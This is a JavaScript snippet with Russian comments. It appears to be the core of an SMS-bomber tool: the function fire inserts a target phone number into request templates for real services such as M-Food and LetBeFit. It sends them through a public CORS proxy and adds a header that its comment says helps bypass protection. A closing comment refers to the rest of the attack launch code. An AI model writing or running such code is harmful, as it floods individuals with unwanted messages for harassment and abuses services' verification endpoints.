<script>
    (function() {
        // ... (код частиц и канваса оставляем твоим) ...

        async function fire(s, phone) {
            try {
                let body;
                let contentType = s.headers?.["Content-Type"] || "application/json";

                // Умная обработка тела запроса
                if (contentType.includes("json")) {
                    let objBody = typeof s.body === 'string' ? JSON.parse(s.body) : s.body;
                    body = JSON.stringify(objBody).replace(/%phone%/g, phone);
                } else {
                    // Для x-www-form-urlencoded (M-Food, LetBeFit)
                    body = String(s.body).replace(/%phone%/g, phone);
                }

                // Список прокси (если один упадет, можно сменить)
                const proxy = "https://corsproxy.io/?";
                const targetUrl = proxy + encodeURIComponent(s.url);

                const response = await fetch(targetUrl, {
                    method: s.method || 'POST',
                    headers: {
                        ...s.headers,
                        "X-Requested-With": "XMLHttpRequest" // Часто помогает обойти защиту
                    },
                    body: body
                });

                console.log(`Сервис ${s.name}: ${response.status}`);
            } catch(e) {
                console.error(`Ошибка в ${s.name}:`, e);
            }
        }

        // ... (остальной код запуска атаки) ...
    })();
</script>
